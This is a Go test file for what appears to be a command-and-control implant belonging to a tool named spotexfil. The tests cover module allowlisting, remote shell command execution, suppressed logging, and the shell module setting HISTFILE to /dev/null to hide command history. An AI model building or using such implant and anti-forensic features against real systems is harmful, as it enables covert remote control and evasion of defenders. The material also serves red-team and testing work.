package c2

import (
	"bytes"
	"io"
	"os"
	"runtime"
	"strings"
	"testing"

	"github.com/sourcefrenchy/spotexfil/internal/protocol"
)

// newTestImplant builds an implant for tests (nil client is fine:
// execute() never touches it). Reuses testModule from c2_test.go.
func newTestImplant(opts ImplantOptions) *Implant {
	if opts.Interval == 0 {
		opts.Interval = 20
	}
	return NewImplantWithOptions(nil, "testkey", opts)
}

func TestExecuteModuleAllowlist(t *testing.T) {
	imp := newTestImplant(ImplantOptions{AllowedModules: []string{"shell"}})

	// Disallowed module -> disabled error
	res := imp.execute(&protocol.C2Message{Module: "screenshot", Seq: 1})
	if res.Status != "error" {
		t.Errorf("disallowed module status: got %s, want error", res.Status)
	}
	if !strings.Contains(res.Data, "disabled") {
		t.Errorf("disallowed module data: got %q, want mention of disabled", res.Data)
	}

	// Allowed module -> executes
	res = imp.execute(&protocol.C2Message{
		Module: "shell",
		Seq:    2,
		Args:   map[string]interface{}{"cmd": "echo hi"},
	})
	if res.Status != "ok" {
		t.Errorf("allowed module status: got %s (%q), want ok", res.Status, res.Data)
	}
}

func TestExecuteNilAllowlist(t *testing.T) {
	// Use a registered custom module for determinism (a nil allowlist
	// must not produce the "disabled" error path).
	RegisterModule(&testModule{name: "testmod_allowlist"})
	defer UnregisterModule("testmod_allowlist")

	imp := newTestImplant(ImplantOptions{}) // nil allowlist
	res := imp.execute(&protocol.C2Message{Module: "testmod_allowlist", Seq: 3})
	if res.Status == "error" && strings.Contains(res.Data, "disabled") {
		t.Errorf("nil allowlist wrongly disabled module: %q", res.Data)
	}
	if res.Status != "ok" {
		t.Errorf("custom module status: got %s (%q), want ok", res.Status, res.Data)
	}
}

// captureStdout runs fn with os.Stdout redirected to a pipe and
// returns whatever was written.
func captureStdout(t *testing.T, fn func()) string {
	t.Helper()
	old := os.Stdout
	r, w, err := os.Pipe()
	if err != nil {
		t.Fatalf("os.Pipe: %v", err)
	}
	os.Stdout = w
	defer func() { os.Stdout = old }()

	fn()

	if err := w.Close(); err != nil {
		t.Fatalf("close pipe: %v", err)
	}
	var buf bytes.Buffer
	if _, err := io.Copy(&buf, r); err != nil {
		t.Fatalf("read pipe: %v", err)
	}
	return buf.String()
}

func TestQuietLogf(t *testing.T) {
	imp := newTestImplant(ImplantOptions{})

	imp.quiet = true
	out := captureStdout(t, func() { imp.logf("hello") })
	if out != "" {
		t.Errorf("quiet logf: got %q, want no output", out)
	}

	imp.quiet = false
	out = captureStdout(t, func() { imp.logf("hello") })
	if out != "hello" {
		t.Errorf("verbose logf: got %q, want %q", out, "hello")
	}
}

func TestShellModuleEnvHardening(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("HISTFILE check is Unix-specific")
	}
	m := &ShellModule{}
	status, data := m.Execute(map[string]interface{}{"cmd": "echo $HISTFILE"})
	if status != "ok" {
		t.Fatalf("status: got %s (%q), want ok", status, data)
	}
	if !strings.Contains(data, "/dev/null") {
		t.Errorf("HISTFILE: got %q, want /dev/null", data)
	}
}
